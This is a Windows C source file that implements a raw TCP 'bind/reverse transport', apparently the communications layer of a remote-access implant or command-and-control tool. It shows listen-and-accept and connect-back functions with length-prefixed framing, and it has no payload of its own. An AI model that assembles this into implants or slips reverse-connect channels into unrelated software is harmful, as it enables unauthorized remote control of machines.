/**
 * transport_tcp.c - Raw TCP bind/reverse transport
 */
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "../../include/transport.h"

#pragma comment(lib, "ws2_32.lib")

static BOOL tcp_send_all(SOCKET s, const BYTE *data, DWORD data_len) {
    DWORD total = 0;
    while (total < data_len) {
        int n = send(s, (const char *)(data + total), (int)(data_len - total), 0);
        if (n <= 0) return FALSE;
        total += (DWORD)n;
    }
    return TRUE;
}

static BOOL tcp_recv_all(SOCKET s, BYTE *buf, DWORD len) {
    DWORD total = 0;
    while (total < len) {
        int n = recv(s, (char *)(buf + total), (int)(len - total), 0);
        if (n <= 0) return FALSE;
        total += (DWORD)n;
    }
    return TRUE;
}

BOOL tcp_transport_bind(TCP_TRANSPORT *t, const char *bind_addr, WORD port) {
    if (!t) return FALSE;
    ZeroMemory(t, sizeof(TCP_TRANSPORT));

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    t->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (t->sock == INVALID_SOCKET) return FALSE;

    t->is_bind = TRUE;
    t->port = port;
    lstrcpynA(t->host, bind_addr ? bind_addr : "0.0.0.0", sizeof(t->host));

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (bind_addr && bind_addr[0])
        inet_pton(AF_INET, bind_addr, &addr.sin_addr);
    else
        addr.sin_addr.s_addr = INADDR_ANY;

    int opt = 1;
    setsockopt(t->sock, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));

    if (bind(t->sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        closesocket(t->sock);
        t->sock = INVALID_SOCKET;
        return FALSE;
    }

    if (listen(t->sock, 1) != 0) {
        closesocket(t->sock);
        t->sock = INVALID_SOCKET;
        return FALSE;
    }

    struct sockaddr_in client;
    int clen = sizeof(client);
    SOCKET peer = accept(t->sock, (struct sockaddr *)&client, &clen);
    closesocket(t->sock);
    t->sock = peer;
    return peer != INVALID_SOCKET;
}

BOOL tcp_transport_reverse(TCP_TRANSPORT *t, const char *host, WORD port) {
    if (!t || !host) return FALSE;
    ZeroMemory(t, sizeof(TCP_TRANSPORT));

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    t->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (t->sock == INVALID_SOCKET) return FALSE;

    t->is_bind = FALSE;
    t->port = port;
    lstrcpynA(t->host, host, sizeof(t->host));

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    if (connect(t->sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        closesocket(t->sock);
        t->sock = INVALID_SOCKET;
        return FALSE;
    }
    return TRUE;
}

BOOL tcp_transport_send(TCP_TRANSPORT *t, const BYTE *data, DWORD data_len) {
    if (!t || t->sock == INVALID_SOCKET || !data) return FALSE;

    BYTE hdr[4];
    hdr[0] = (BYTE)((data_len >> 24) & 0xFF);
    hdr[1] = (BYTE)((data_len >> 16) & 0xFF);
    hdr[2] = (BYTE)((data_len >> 8) & 0xFF);
    hdr[3] = (BYTE)(data_len & 0xFF);

    if (!tcp_send_all(t->sock, hdr, 4)) return FALSE;
    return tcp_send_all(t->sock, data, data_len);
}

BOOL tcp_transport_recv(TCP_TRANSPORT *t, BYTE **out_data, DWORD *out_len) {
    if (!t || t->sock == INVALID_SOCKET || !out_data || !out_len) return FALSE;

    BYTE hdr[4];
    if (!tcp_recv_all(t->sock, hdr, 4)) return FALSE;

    DWORD data_len = ((DWORD)hdr[0] << 24) | ((DWORD)hdr[1] << 16) |
                     ((DWORD)hdr[2] << 8) | (DWORD)hdr[3];
    if (data_len == 0 || data_len > MAX_OUTPUT_SIZE) return FALSE;

    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, data_len);
    if (!buf) return FALSE;

    if (!tcp_recv_all(t->sock, buf, data_len)) {
        HeapFree(GetProcessHeap(), 0, buf);
        return FALSE;
    }

    *out_data = buf;
    *out_len = data_len;
    return TRUE;
}

void tcp_transport_close(TCP_TRANSPORT *t) {
    if (!t) return;
    if (t->sock != INVALID_SOCKET) {
        closesocket(t->sock);
        t->sock = INVALID_SOCKET;
    }
}
